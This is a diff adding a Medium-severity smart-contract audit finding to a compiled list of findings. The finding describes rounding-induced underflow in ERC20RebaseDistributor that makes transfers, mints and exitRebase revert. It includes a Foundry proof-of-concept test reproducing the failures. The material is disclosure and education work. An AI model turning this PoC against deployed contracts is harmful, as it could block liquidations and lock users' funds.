@@ -168,3 +168,57 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 3.[Medium] Rounding errors can cause ERC20RebaseDistributor transfers and mints to fail for underflow
+
+### Underflow by rounding errors
+
+- Summary: Rounding issues in ERC20RebaseDistributor can cause transfers to fail if there's a discrepancy in share calculations. This can be exploited to disrupt operations like liquidations, as affected addresses cannot exit rebase to fix transfers.
+
+- Impact & Recommendation: Transfers and mints involving rebasing addresses may fail. To fix this, consider adjusting share calculations to tolerate rounding fluctuations, like flooring the relevant subtractions to 0.
+  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/294) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+
+    function testM2bis() external {
+        uint t0 = block.timestamp;
+        // set up the credit token with the minimum 100e18 rebasing supply
+        // as indicated here ->
+
+        ct.mint(address(1), 100e18);
+        vm.prank(address(1));
+        ct.enterRebase();
+
+        ct.mint(address(2), 6e11); vm.prank(address(2)); ct.distribute(6e11);
+        vm.warp(2);
+        ct.mint(address(2), 3e12); vm.prank(address(2)); ct.distribute(3e12);
+        vm.warp(3);
+
+        ct.mint(address(3), 1e20);
+        vm.prank(address(3));
+        // ☢️ this shouldn't revert!
+        vm.expectRevert();
+        ct.transfer(address(1), 1e20);
+        // ☢️ this shouldn't either!
+        vm.expectRevert();
+        ct.mint(address(1), 1e20);
+        // ☢️ this too..
+        vm.prank(address(1));
+        vm.expectRevert();
+        ct.exitRebase();
+        // ☢️ same here...
+        vm.startPrank(address(1));
+        vm.expectRevert();
+        ct.transfer(address(3), 1e20);
+        // ☢️ I bet you saw this coming...
+        ct.approve(address(3), 1e20);
+        vm.startPrank(address(3));
+        vm.expectRevert();
+        ct.transferFrom(address(1), address(3), 1e20);
+    }
+
+  ```
+
+  </details>
